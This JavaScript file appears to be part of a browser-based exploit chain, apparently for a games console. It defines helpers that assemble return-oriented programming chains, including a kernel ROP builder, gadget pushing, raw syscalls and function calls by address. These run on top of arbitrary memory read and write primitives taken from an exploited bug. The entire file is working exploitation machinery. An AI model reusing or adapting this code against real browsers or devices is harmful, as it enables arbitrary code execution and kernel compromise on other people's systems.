var memory = function(p, address) {
    this.basePtr = address
    this.dataPtr = 0;

    /* Return a pointer in mmap'd memory */
    this.allocate = function(size) {
        /* Prevent buffer overflow / pagefault */
        if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000) {
            return -1;
        }

        var memAddr = add2(this.basePtr, this.dataPtr);

        this.dataPtr += size;

        return memAddr;
    };

    /* Clears all data by zeroing out this.data and resetting count */
    this.clear = function() {
        for (var i = 0; i < 0x10000; i += 8) {
            p.write8(0, add2(this.basePtr, i));
        }
    };

    /* Zero out our data buffer before returning a storage object */
    this.clear();

    return this;
};

/* Called to start a kernel ROP chain */
var krop = function(p, addr) {
    this.chainPtr = addr;
    this.count = 0;

    this.push = function(val) {
        p.write8(val, add2(this.chainPtr, this.count * 8));
        this.count++;
    };

    this.write64 = function(addr, val) {
        this.pushGadget('pop rdi');
        this.push(addr);
        this.pushGadget('pop rax');
        this.push(val);
        this.pushGadget('mov qword ptr [rdi], rax');
    }

    return this;
};

/* Called to start a new ROP chain */
var saferop = function(p, addr) {
    this.ropChain = undefined;
    this.ropChainPtr = undefined;
    this.ropChainEndPtr = undefined;

    if (addr == undefined) {
        this.ropChain = new Uint32Array(0x4000);
        this.ropChainPtr = p.read8(add2(p.getAddr(this.ropChain), 0x28));
        this.ropChainEndPtr = add2(this.ropChainPtr, 0x4000 * 4);
    } else {
        this.ropChainPtr = addr;
        this.ropChainEndPtr = add2(this.ropChainPtr, 0x4000 * 4);
    }

    this.count = 0;

    /* Clears the chain */
    this.clear = function() {
        this.count = 0;
        this.runtime = undefined;

        for (var i = 0; i < 0x4000 - 0x8; i += 8) {
            p.write8(0, add2(this.ropChainPtr, i));
        }
    };

    /* Gets the current chain index and increments it */
    this.getChainIndex = function() {
        this.count++;
        return this.count - 1;
    }

    /* Pushes a gadget or value on the stack */
    this.push = function(val) {
        p.write8(val, add2(this.ropChainPtr, this.getChainIndex() * 8));
    }

    this.pushGadget = function(val) {
        var gadget = window.gadgets[val];

        if (gadget === undefined) throw new Error('Gadget not found');
        this.push(gadget);
    };

    /* Writes a 64-bit value to given location */
    this.push64 = function(where, what) {
        this.pushGadget('pop rdi');
        this.push(where);
        this.pushGadget('pop rsi');
        this.push(what);
        this.pushGadget('mov qword ptr [rdi], rsi');
    }

    /* Sets up a function call into a module by address */
    this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.pushGadget('pop rdi');
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.pushGadget('pop rsi');
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.pushGadget('pop rdx');
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.pushGadget('pop rcx');
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.pushGadget('pop r8');
            this.push(r8);
        }

        if (r9 != undefined) {
            this.pushGadget('pop r9');
            this.push(r9);
        }

        this.push(rip);
        return this;
    }

    /* Sets up a return value location*/
    this.saveReturnValue = function(where) {
        this.pushGadget('pop rdi');
        this.push(where);
        this.pushGadget('mov qword ptr [rdi], rax');
    }

    /* Loads the ROP chain and initializes it */
    this.run = function() {
        var retv = p.loadChain(this);
        this.clear();

        return retv;
    }

    return this;
};

/* Called to start a new ROP chain */
var rop = function(p, addr) {
    this.ropChainSize = 0x4000;
    this.ropChain = undefined;
    this.ropChainBasePtr = undefined;
    this.ropChainPtr = undefined;
    this.ropChainEndPtr = undefined;


    if (addr == undefined) {
        this.ropChain = new Uint32Array((this.ropChainSize / 4) * 2);
        this.ropChainBasePtr = add2(p.getArrayBufferAddr(this.ropChain), this.ropChainSize);
        this.ropChainPtr = add2(this.ropChainBasePtr, 8);
        this.ropChainEndPtr = add2(this.ropChainBasePtr, this.ropChainSize);
    } else {
        this.ropChainBasePtr = add2(addr, 0);
        this.ropChainPtr = add2(addr, 8);
        this.ropChainEndPtr = add2(addr, this.ropChainSize);
    }

    this.count = 0;

    /* Clears the chain */
    this.clear = function() {
        this.count = 0;
        this.runtime = undefined;

        for (var i = 0; i < this.ropChainSize - 8; i += 8) {
            p.write8(0, add2(this.ropChainBasePtr, i));
        }
    };

    /* Gets the current chain index and increments it */
    this.getChainIndex = function() {
        this.count++;
        return this.count - 1;
    };

    /* Pushes a gadget or value on the stack */
    this.push = function(val) {
        // debug_log(`Push in ROP: ${paddr(val)}`);
        p.write8(val, add2(this.ropChainPtr, this.getChainIndex() * 8));
    };

    this.pushGadget = function(val) {
        var gadget = window.gadgets[val];

        if (gadget === undefined) throw new Error('Gadget not found');
        this.push(gadget);
    };

    /* Writes a 64-bit value to given location */
    this.push64 = function(where, what) {
        this.pushGadget('pop rdi');
        this.push(where);
        this.pushGadget('pop rsi');
        this.push(what);
        this.pushGadget('mov qword ptr [rdi], rsi');
    };

    this.syscall = function(num, rdi, rsi, rdx, rcx, r8, r9) {
        if (num != undefined) {
            this.pushGadget('pop rax');
            this.push(num);
        }

        if (rdi != undefined) {
            this.pushGadget('pop rdi');
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.pushGadget('pop rsi');
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.pushGadget('pop rdx');
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.pushGadget('pop rcx');
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.pushGadget('pop r8');
            this.push(r8);
        }

        if (r9 != undefined) {
            this.pushGadget('pop r9');
            this.push(r9);
        }

        this.pushGadget('syscall');

        return this;
    };

    /* Sets up a function call into a module by address */
    this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.pushGadget('pop rdi');
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.pushGadget('pop rsi');
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.pushGadget('pop rdx');
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.pushGadget('pop rcx');
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.pushGadget('pop r8');
            this.push(r8);
        }

        if (r9 != undefined) {
            this.pushGadget('pop r9');
            this.push(r9);
        }

        this.push(rip);
        return this;
    };

    /* Sets up a return value location*/
    this.saveReturnValue = function(where) {
        this.pushGadget('pop rdi');
        this.push(where);
        this.pushGadget('mov qword ptr [rdi], rax');
    };

    /* Loads the ROP chain and initializes it */
    this.run = function() {
        var retv = p.loadChain2(this);
        this.clear();
        return retv;
    };

    return this;
};